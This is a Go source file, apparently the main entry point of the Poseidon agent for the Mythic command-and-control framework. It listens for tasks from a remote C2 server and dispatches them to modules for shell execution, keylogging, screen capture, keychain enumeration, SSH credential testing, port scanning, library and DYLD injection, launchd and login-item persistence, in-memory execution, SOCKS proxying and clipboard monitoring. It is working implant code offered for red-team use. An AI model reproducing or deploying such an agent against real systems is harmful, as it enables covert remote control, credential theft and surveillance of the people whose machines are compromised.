package main

import (
	"C"
	"encoding/base64"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/enums/InteractiveTask"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/files"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/p2p"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/print_c2"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/print_p2p"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pty"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/rpfwd"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/update_c2"

	// Standard
	"encoding/json"
	"fmt"
	"sort"
	"sync"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cat"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cd"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/clipboard_monitor"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cp"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/curl"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/download"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/drives"
	dyldinject "github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/dyld_inject"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/execute_macho"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/execute_memory"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/getenv"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/getuser"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jsimport"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jsimport_call"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jxa"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/keylog"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/keys"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/kill"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/libinject"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/list_entitlements"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/listtasks"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/ls"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/mkdir"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/mv"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/persist_launchd"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/persist_loginitem"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/portscan"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/ps"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pwd"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/rm"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/run"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/screencapture"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/setenv"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/shell"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/socks"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/sshauth"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/triagedirectory"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/unsetenv"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/upload"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/xpc"
)
import (
	//_ "net/http/pprof"
	"os"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/link_tcp"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/sleep"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/unlink_tcp"
)

const (
	NONE_CODE = 100
	EXIT_CODE = -1
)

// list of currently running tasks

var runningTasks = make(map[string]structs.Task)
var runningTaskMutex sync.RWMutex
var removeRunningTasksChannel = make(chan string, 10)

// channel processes new tasking for this agent
var newTaskChannel = make(chan structs.Task, 10)

// Mapping of command names to integers
var tasktypes = map[string]int{
	"exit":              EXIT_CODE,
	"shell":             1,
	"screencapture":     2,
	"keylog":            3,
	"download":          4,
	"upload":            5,
	"libinject":         6,
	"ps":                8,
	"sleep":             9,
	"cat":               10,
	"cd":                11,
	"ls":                12,
	"python":            13,
	"jxa":               14,
	"keys":              15,
	"triagedirectory":   16,
	"sshauth":           17,
	"portscan":          18,
	"jobs":              21,
	"jobkill":           22,
	"cp":                23,
	"drives":            24,
	"getuser":           25,
	"mkdir":             26,
	"mv":                27,
	"pwd":               28,
	"rm":                29,
	"getenv":            30,
	"setenv":            31,
	"unsetenv":          32,
	"kill":              33,
	"curl":              34,
	"xpc":               35,
	"socks":             36,
	"listtasks":         37,
	"list_entitlements": 38,
	"execute_memory":    39,
	"jsimport":          40,
	"jsimport_call":     41,
	"persist_launchd":   42,
	"persist_loginitem": 43,
	"dyld_inject":       44,
	"link_tcp":          45,
	"unlink_tcp":        46,
	"run":               47,
	"clipboard_monitor": 48,
	"execute_macho":     49,
	"rpfwd":             50,
	"print_p2p":         51,
	"print_c2":          52,
	"update_c2":         53,
	"pty":               54,
	"none":              NONE_CODE,
}

//export RunMain
func RunMain() {
	main()
}

// go routine that listens for messages that should go to Mythic for getting files from Mythic
// get things ready to transfer a file from Mythic -> Poseidon

func listenForInboundMythicMessageFromEgressP2PChannel() {
	for {
		//fmt.Printf("looping to see if there's messages in the profiles.HandleInboundMythicMessageFromEgressP2PChannel\n")
		message := <-profiles.HandleInboundMythicMessageFromEgressP2PChannel
		//fmt.Printf("Got message from HandleInboundMythicMessageFromEgressP2PChannel\n")
		handleMythicMessageResponse(message)
	}
}

// Handle responses from mythic from post_response
func handleMythicMessageResponse(mythicMessage structs.MythicMessageResponse) {
	// Handle the response from mythic
	//fmt.Printf("handleMythicMessageResponse:\n%v\n", mythicMessage)
	// loop through each response and check to see if the file_id or task_id matches any existing background tasks
	for i := 0; i < len(mythicMessage.Responses); i++ {
		var r map[string]interface{}
		err := json.Unmarshal(mythicMessage.Responses[i], &r)
		if err != nil {
			//log.Printf("Error unmarshal response to task response: %s", err.Error())
			break
		}
		if taskid, ok := r["task_id"]; ok {
			if task, exists := runningTasks[taskid.(string)]; exists {
				// send data to the channel
				if exists {
					raw, _ := json.Marshal(r)
					if trackingUUID, ok := r["tracking_uuid"]; ok {
						if fileTransfer, exists := task.Job.FileTransfers[trackingUUID.(string)]; exists {
							go func() {
								fileTransfer <- raw
							}()
							continue
						}
					}
					go func() {
						task.Job.ReceiveResponses <- raw
					}()
					continue
				}
			}
		}
	}
	// loop through each socks message and send it off
	for j := 0; j < len(mythicMessage.Socks); j++ {
		//fmt.Printf("got socks message from Mythic %v\n", mythicMessage.Socks[j])
		profiles.FromMythicSocksChannel <- mythicMessage.Socks[j]
		//fmt.Printf("sent socks message to profiles.FromMythicSocksChannel %v\n", mythicMessage.Socks[j].ServerId)
	}
	// loop through each rpwfd message and send it off
	for j := 0; j < len(mythicMessage.Rpfwds); j++ {
		profiles.FromMythicRpfwdChannel <- mythicMessage.Rpfwds[j]
	}
	// loop through interactive tasks
	for j := 0; j < len(mythicMessage.InteractiveTasks); j++ {
		if task, exists := runningTasks[mythicMessage.InteractiveTasks[j].TaskUUID]; exists {
			fmt.Printf("interactive task exists, sending data along\n")
			task.Job.InteractiveTaskInputChannel <- mythicMessage.InteractiveTasks[j]
		} else {
			profiles.NewInteractiveTaskOutputChannel <- structs.InteractiveTaskMessage{
				TaskUUID:    mythicMessage.InteractiveTasks[j].TaskUUID,
				Data:        base64.StdEncoding.EncodeToString([]byte("Task no longer running\n")),
				MessageType: InteractiveTask.Error,
			}
		}
	}
	// sort the Tasks
	sort.Slice(mythicMessage.Tasks, func(i, j int) bool {
		return mythicMessage.Tasks[i].Timestamp < mythicMessage.Tasks[j].Timestamp
	})
	// for each task, give it the appropriate Job information and send it on its way for processing
	for j := 0; j < len(mythicMessage.Tasks); j++ {
		job := &structs.Job{
			Stop:                            new(int),
			ReceiveResponses:                make(chan json.RawMessage, 10),
			SendResponses:                   profiles.NewResponseChannel,
			SendFileToMythic:                files.SendToMythicChannel,
			FileTransfers:                   make(map[string]chan json.RawMessage),
			GetFileFromMythic:               files.GetFromMythicChannel,
			SaveFileFunc:                    files.SaveToMemory,
			RemoveSavedFile:                 files.RemoveFromMemory,
			GetSavedFile:                    files.GetFromMemory,
			AddInternalConnectionChannel:    p2p.AddInternalConnectionChannel,
			RemoveInternalConnectionChannel: p2p.RemoveInternalConnectionChannel,
			InteractiveTaskOutputChannel:    profiles.NewInteractiveTaskOutputChannel,
			InteractiveTaskInputChannel:     make(chan structs.InteractiveTaskMessage, 50),
			NewAlertChannel:                 profiles.NewAlertChannel,
		}
		mythicMessage.Tasks[j].Job = job
		runningTaskMutex.Lock()
		runningTasks[mythicMessage.Tasks[j].TaskID] = mythicMessage.Tasks[j]
		runningTaskMutex.Unlock()
		newTaskChannel <- mythicMessage.Tasks[j]
	}
	// loop through each delegate and try to forward it along
	if len(mythicMessage.Delegates) > 0 {
		p2p.HandleDelegateMessageForInternalP2PConnections(mythicMessage.Delegates)
	}
	//fmt.Printf("returning from handleMythicMessageResponse\n")
	return
}

// process new tasking and call their go routines
func listenForNewTask() {
	for {
		task := <-newTaskChannel
		switch tasktypes[task.Command] {
		case EXIT_CODE:
			os.Exit(0)
			break
		case 1:
			go shell.Run(task)
			break
		case 2:
			go screencapture.Run(task)
			break
		case 3:
			go keylog.Run(task)
			break
		case 4:
			go download.Run(task)
			break
		case 5:
			go upload.Run(task)
			break
		case 6:
			go libinject.Run(task)
			break
		case 8:
			go ps.Run(task)
			break
		case 9:
			// Sleep
			go sleep.Run(task)
			break
		case 10:
			//Cat a file
			go cat.Run(task)
			break
		case 11:
			//Change cwd
			go cd.Run(task)
			break
		case 12:
			//List directory contents
			go ls.Run(task)
			break
		case 14:
			//Execute jxa code in memory
			go jxa.Run(task)
			break
		case 15:
			// Enumerate keyring data for linux or the keychain for macos
			go keys.Run(task)
			break
		case 16:
			// Triage a directory and organize files by type
			go triagedirectory.Run(task)
			break
		case 17:
			// Test credentials against remote hosts
			go sshauth.Run(task)
			break
		case 18:
			// Scan ports on remote hosts.
			go portscan.Run(task)
			break
		case 21:
			// Return the list of jobs.
			go getJobListing(task)
			break
		case 22:
			// Kill the job
			go killJob(task)
			break
		case 23:
			go cp.Run(task)
			break
		case 24:
			// List drives on a machine
			go drives.Run(task)
			break
		case 25:
			// Retrieve information about the current user.
			go getuser.Run(task)
			break
		case 26:
			// Make a directory
			go mkdir.Run(task)
			break
		case 27:
			// Move files
			go mv.Run(task)
			break
		case 28:
			// Print working directory
			go pwd.Run(task)
			break
		case 29:
			go rm.Run(task)
			break
		case 30:
			go getenv.Run(task)
			break
		case 31:
			go setenv.Run(task)
			break
		case 32:
			go unsetenv.Run(task)
			break
		case 33:
			go kill.Run(task)
			break
		case 34:
			go curl.Run(task)
			break
		case 35:
			go xpc.Run(task)
			break
		case 36:
			go socks.Run(task)
			break
		case 37:
			go listtasks.Run(task)
			break
		case 38:
			go list_entitlements.Run(task)
			break
		case 39:
			go execute_memory.Run(task)
			break
		case 40:
			go jsimport.Run(task)
			break
		case 41:
			//Execute jxa code in memory from the script imported by jsimport
			go jsimport_call.Run(task)
			break
		case 42:
			//Execute persist_launch command to install launchd persistence
			go persist_launchd.Run(task)
			break
		case 43:
			// Execute persist_loginitem command to install login item persistence
			go persist_loginitem.Run(task)
			break
		case 44:
			// Execute spawn_libinject command to spawn a target application/binary with the DYLD_INSERT_LIBRARIES variable set to an arbitrary dylib
			go dyldinject.Run(task)
			break
		case 45:
			go link_tcp.Run(task)
			break
		case 46:
			go unlink_tcp.Run(task)
			break
		case 47:
			go run.Run(task)
			break
		case 48:
			go clipboard_monitor.Run(task)
			break
		case 49:
			go execute_macho.Run(task)
			break
		case 50:
			go rpfwd.Run(task)
			break
		case 51:
			go print_p2p.Run(task)
			break
		case 52:
			go print_c2.Run(task)
			break
		case 53:
			go update_c2.Run(task)
			break
		case 54:
			go pty.Run(task)
			break
		case NONE_CODE:
			// No tasks, do nothing
			break
		}
	}
}

func listenForRemoveRunningTask() {
	for {
		select {
		case task := <-removeRunningTasksChannel:
			runningTaskMutex.Lock()
			delete(runningTasks, task)
			runningTaskMutex.Unlock()
		}
	}
}

func getJobListing(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	msg.Completed = true
	// For graceful error handling server-side when zero jobs are processing.
	if len(runningTasks) == 0 {

		msg.UserOutput = "0 jobs"
	} else {
		var jobList []structs.TaskStub
		for _, x := range runningTasks {
			jobList = append(jobList, x.ToStub())
		}
		jsonSlices, err := json.MarshalIndent(jobList, "", "	")
		if err != nil {
			msg.UserOutput = err.Error()
			msg.Status = "error"
		} else {
			msg.UserOutput = string(jsonSlices)
		}

	}
	task.Job.SendResponses <- msg
}

func killJob(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	foundTask := false
	for _, taskItem := range runningTasks {
		if taskItem.TaskID == task.Params {
			*taskItem.Job.Stop = 1
			foundTask = true
			break
		}
	}

	if foundTask {
		msg.UserOutput = fmt.Sprintf("Sent kill signal to Job ID: %s", task.Params)
		msg.Completed = true
	} else {
		msg.UserOutput = fmt.Sprintf("No job with ID: %s", task.Params)
		msg.Completed = true
	}
	task.Job.SendResponses <- msg
}

func main() {
	files.Initialize()
	p2p.Initialize()
	profiles.Initialize(removeRunningTasksChannel)
	go listenForRemoveRunningTask()
	go listenForNewTask()
	go listenForInboundMythicMessageFromEgressP2PChannel()
	/*
		go func() {
			log.Println(http.ListenAndServe("192.168.0.127:8080", nil))
		}()
	*/
	profiles.Start()

}
